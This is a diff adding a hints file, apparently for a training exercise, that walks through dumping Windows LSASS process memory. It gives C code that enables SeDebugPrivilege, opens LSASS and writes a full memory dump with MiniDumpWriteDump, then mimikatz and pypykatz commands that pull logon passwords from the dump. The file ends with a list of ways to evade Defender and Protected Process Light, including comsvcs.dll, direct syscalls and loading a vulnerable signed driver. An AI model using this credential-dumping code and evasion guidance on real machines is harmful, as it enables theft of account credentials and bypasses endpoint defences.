@@ -1,0 +1,29 @@
+=== HINT 1: Enable SeDebugPrivilege ===
+// enable_debug_privilege() helper already in the exercise
+
+=== HINT 2: Find LSASS PID ===
+DWORD lsass_pid = find_lsass_pid();  // helper already provided
+
+=== HINT 3: Open LSASS ===
+HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
+
+=== HINT 4: Create dump file ===
+HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL,
+    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+=== HINT 5: Write dump ===
+BOOL ok = MiniDumpWriteDump(hProc, lsass_pid, hFile,
+    MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+=== KEY INSIGHT ===
+Parse with: pypykatz lsa minidump lsass.dmp
+            mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonPasswords
+Defender blocks MiniDumpWriteDump on lsass.exe directly (Protected Process Light).
+Evasion techniques:
+  - comsvcs.dll rundll32 dump (living-off-the-land)
+  - ProcDump (signed MS tool)
+  - Direct syscall to bypass user-mode hooks on NtReadVirtualMemory
+  - Shadow copy / VSS dump (access lsass.dmp from shadow copy - not PPL protected)
+  - ProcExp signed driver (kernel access)
+LSASS PPL (Protected Process Light): MiniDumpWriteDump returns ERROR_ACCESS_DENIED.
+Bypass: load vulnerable signed driver to remove PPL protection (BYOVD).
